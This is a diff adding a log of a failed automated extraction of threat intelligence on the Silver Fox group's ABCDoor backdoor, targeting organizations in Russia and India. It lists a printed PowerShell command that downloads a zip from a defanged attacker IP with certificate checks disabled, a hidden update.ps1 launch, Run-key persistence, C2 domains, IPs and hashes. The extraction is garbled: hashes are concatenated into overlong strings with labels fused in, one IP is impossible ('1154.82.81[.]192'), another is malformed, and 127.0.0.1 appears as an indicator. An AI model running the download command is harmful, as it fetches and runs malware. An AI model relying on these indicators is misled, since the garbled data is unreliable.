@@ -1,0 +1,86 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T16:52:26.957849
+# Response length: 4724 chars
+# Input chunk preview: 'll the Node.js interpreter. KEDR Expert detects this activity using the nodejs_dist_url_amsi rule.Silver Fox activity can also be detected by monitoring requests to external services to determine the '
+# ============================================================
+
+title: "Silver Fox Activity and ABCDoor Backdoor Targeting Organizations in Russia and India"
+description: Silver Fox uses the new ABCDoor backdoor to target organizations in Russia and India, establishing persistence via registry modifications and using external services for C2 communication.
+attribution: ""
+malware_families:
+  - ABCDoor
+cves: []
+ttps:
+  processes:
+    - pythonw.exe
+  command_lines:
+    - cmd /c start /min python/pythonw.exe -m appclient
+  powershell:
+    - "& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri 'hxxp://154.82.81[.]205/YD20251001143052.zip' -OutFile '$appdata\appclient\111.zip' -UseBasicParsing -TimeoutSec 600 } catch { exit 1 } }"
+    - "Start-Sleep -Seconds 5; Start-Process -FilePath \"%TEMP%\tmpXXXXXXXX\update\update.ps1\" -ArgumentList \"%LOCALAPPDATA%\appclient\" -WindowStyle Hidden"
+  scripts: []
+  registry_keys:
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads: []
+  network_connections:
+    - pythonw.exe -> ABCDoor C245.118.133[.]203:5000
+    - pythonw.exe -> abc.fetish-friends[.]com
+    - pythonw.exe -> abc.3mkorealtd[.]com
+    - pythonw.exe -> abc.sudsmama[.]com
+    - pythonw.exe -> abc.woopami[.]com
+    - pythonw.exe -> abc.ilptour[.]com
+    - pythonw.exe -> abc.petitechanson[.]com
+    - pythonw.exe -> abc.doublemobile[.]com
+    - pythonw.exe -> smcagov[.]cc
+    - pythonw.exe -> croldco[.]com
+    - pythonw.exe -> vnc.kcii2[.]com
+    - pythonw.exe -> abc.haijing88[.]com
+  file_activity:
+    - C:\Users\<user>\AppData\Local\appclient\
+    - %LOCALAPPDATA%\appclient\
+    - %TEMP%\tmpXXXXXXXX\update\update.ps1
+  persistence:
+    - Registry Run key (HKCU) pointing to pythonw.exe with appclient module
+  process_relations: []
+iocs:
+  hashes:
+    - 1AA72CD19E37570E14D898DFF3F2E38079CD56FC9ABF294B9BA8751E618EC6420B9B420E3EDD2ADE5EDC44F60CA745A26611E902945E97A1B27F322A50566D4884E54C3602D
+    - 2B92E125184469A0C3740ABCAA10350C043E457726F1BBB6046CB0C9869DBD7D
+    - 6495C409B59DEB72CFCB2B2DA983B3BBB500E0A8C87DFFE6F20C6E067B51AFBF90257AA1E7C9118055C09D4A978D4BEEF8371097121549FEB21E3BCC2EEEA522814032EEC3BC31643F8FAA4234D0E0497BEF56F4181AEFB7A0A9873FB4B23D302B7F23453C98C11CA7B2E4616EA234850DFDFD7EE128F648F9750DD2C44FC5EC1DE89CE3FCDD3E70DB4A9C39D1A0D1223CA4327AA5F7674BDA8779323F70AE9CA2A285DA9005A8ACB32DD31ACEDD0114FFACC6610B5A4A1CB0E79624CC891DE2FF486A1824F2DB01C1BDF1D2E9B0E06925DB5416DFC90BABF46402CD6FAD39A5790B79178D02AC739099B8E1F4D1D78CD1436991ADB9C005CC7C6B5B982C5A1DD4CB53287FE0ED14E0B7B7B1B7E6362A81991323E198A463A8CE255533CB3D86E3EC2736EE1C883706FCA172F8A083C546DC66B0F2A5E0E2E68032F62C70016DDBCB8543BDB06E0F8C509EE9808FC911CA37F9F451A213B967F016F1F8202A5BCB87C34993318CFA3FA0C7ECB006130DC648621E93ACB9EFB9FABB9651F7037CC9A5659D5A1F68E885822423758AC5BEE89436B29F9817E434507FEF555ED84B2099E220D645934E1FD552AE3A27A3C439308F5C4956D77E23E1AAD1A953B68CA8D7A54C15700CF9500AE4A4E21D1F71936DB05F67765F442FEB95F3FD3C6AEC25EBB2D51E1F16C2EEF181C82A7F27818E4244310A645984CCC41EA818A75713F0310E74FFD24D91E5731C4D314FC8C7856A8C2130286429686E200ED3417B9CF7ACB22FAE9E24603D4DE1194933F1CB8ED2CED5D0DD2877C5EA374E8B5CA812843570DCF8E7F35CACAB36D4A
+    - 4A5195A38A458CDD2C1B5AB13AF3B393E66BAE6E8621DB2A835FA6721C3E5BBEABCDoor stagers and loaders
+    - 04194F8DDD0518FD8005F0E87AE96335F15A67899CFE4DECFF76D4CD1677C25411705121F64FA36F1E9D7E59867B0724
+    - 4D343515F4C87B9A2FFD2F46665D2D57DFC64DD9D8F776CA5440C35FEF5D406EEEFC28E9F2C0C0592AF186BE8E3570D26CF382D3A0EAE57B8BAAA263E4ED8D0032407207E9E9A0948D167DCA96C41D1AD17CAF6F5D6BA3393A3A865D1C43C3D2ABCDoor .pyd files
+    - 13669B8F2BD0AF53A3FE9AC0490499E55B998A5BC5AD1C550564294034D4A62CC50C980D3F4B7ED970F083B0D37A6A6ADE8F0008B15F2404F721F76FAC34456A9BF9F635019494C4B70FB0A7C0FB53E4A543B96B0938DE798DD4F683DD92A94AFA08B243F12E31940B8B4B82D3498804
+  ip_addresses:
+    - 45.118.133[.]203
+    - 108.187.37[.]85
+    - 108.187.42[.]63
+    - 207.56.138[.]28
+    - 108.187.41[.]22
+    - 1154.82.81[.]192
+    - 139.180.128[.]251
+    - 192.229.115[.]229
+    - 207.56.119[.]216
+    - 192.163.167[.]144
+    - 5.192.219[.]60
+    - 192.238.205[.]47
+    - 5.32.108[.]178
+    - 57.133.212[.]106
+    - 154.82.81[.]205
+    - 154.82.81[.]203
+    - 127.0.0.1
+  domains:
+    - abc.fetish-friends[.]com
+    - abc.3mkorealtd[.]com
+    - abc.sudsmama[.]com
+    - abc.woopami[.]com
+    - abc.ilptour[.]com
+    - abc.petitechanson[.]com
+    - abc.doublemobile[.]com
+    - smcagov[.]cc
+    - croldco[.]com
+    - vnc.kcii2[.]com
+    - abc.haijing88[.]com
+  urls:
+    - hxxp://154.82.81[.]205/YD20251001143052.zip
+authors: []
